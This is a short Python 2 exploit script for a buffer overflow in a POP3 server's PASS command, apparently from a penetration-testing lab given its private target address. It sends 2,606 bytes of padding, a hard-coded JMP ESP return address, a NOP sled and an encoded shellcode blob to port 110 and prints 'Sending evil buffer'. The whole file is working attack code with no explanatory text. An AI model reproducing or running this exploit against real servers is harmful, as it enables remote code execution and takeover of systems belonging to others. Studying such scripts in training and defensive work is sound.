#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# #  5F4A358F	FFE4		 JMP ESP
shellcode = ("\xbf\xd3\xb5\x4f\xf7\xdb\xc1\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x7d\x12\x03\x7d\x12\x83\x3e\x49\xad\x02\x3c\x5a\xb0"
"\xed\xbc\x9b\xd5\x64\x59\xaa\xd5\x13\x2a\x9d\xe5\x50\x7e\x12"
"\x8d\x35\x6a\xa1\xe3\x91\x9d\x02\x49\xc4\x90\x93\xe2\x34\xb3"
"\x17\xf9\x68\x13\x29\x32\x7d\x52\x6e\x2f\x8c\x06\x27\x3b\x23"
"\xb6\x4c\x71\xf8\x3d\x1e\x97\x78\xa2\xd7\x96\xa9\x75\x63\xc1"
"\x69\x74\xa0\x79\x20\x6e\xa5\x44\xfa\x05\x1d\x32\xfd\xcf\x6f"
"\xbb\x52\x2e\x40\x4e\xaa\x77\x67\xb1\xd9\x81\x9b\x4c\xda\x56"
"\xe1\x8a\x6f\x4c\x41\x58\xd7\xa8\x73\x8d\x8e\x3b\x7f\x7a\xc4"
"\x63\x9c\x7d\x09\x18\x98\xf6\xac\xce\x28\x4c\x8b\xca\x71\x16"
"\xb2\x4b\xdc\xf9\xcb\x8b\xbf\xa6\x69\xc0\x52\xb2\x03\x8b\x3a"
"\x77\x2e\x33\xbb\x1f\x39\x40\x89\x80\x91\xce\xa1\x49\x3c\x09"
"\xc5\x63\xf8\x85\x38\x8c\xf9\x8c\xfe\xd8\xa9\xa6\xd7\x60\x22"
"\x36\xd7\xb4\xe5\x66\x77\x67\x46\xd6\x37\xd7\x2e\x3c\xb8\x08"
"\x4e\x3f\x12\x21\xe5\xba\xf5\x44\xf1\xce\x1e\x31\x07\xce\x21"
"\x7a\x8e\x28\x4b\x6c\xc7\xe3\xe4\x15\x42\x7f\x94\xda\x58\xfa"
"\x96\x51\x6f\xfb\x59\x92\x1a\xef\x0e\x52\x51\x4d\x98\x6d\x4f"
"\xf9\x46\xff\x14\xf9\x01\x1c\x83\xae\x46\xd2\xda\x3a\x7b\x4d"
"\x75\x58\x86\x0b\xbe\xd8\x5d\xe8\x41\xe1\x10\x54\x66\xf1\xec"
"\x55\x22\xa5\xa0\x03\xfc\x13\x07\xfa\x4e\xcd\xd1\x51\x19\x99"
"\xa4\x99\x9a\xdf\xa8\xf7\x6c\x3f\x18\xae\x28\x40\x95\x26\xbd"
"\x39\xcb\xd6\x42\x90\x4f\xe6\x08\xb8\xe6\x6f\xd5\x29\xbb\xed"
"\xe6\x84\xf8\x0b\x65\x2c\x81\xef\x75\x45\x84\xb4\x31\xb6\xf4"
"\xa5\xd7\xb8\xab\xc6\xfd")
 

buffer = "A"*2606 +"\x8F\x35\x4a\x5f" + "\x90" * 16 + shellcode + "C"*(3500-2606-4-351-16)

try:
    print "\nSending evil buffer..."
    s.connect(('10.11.10.27',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
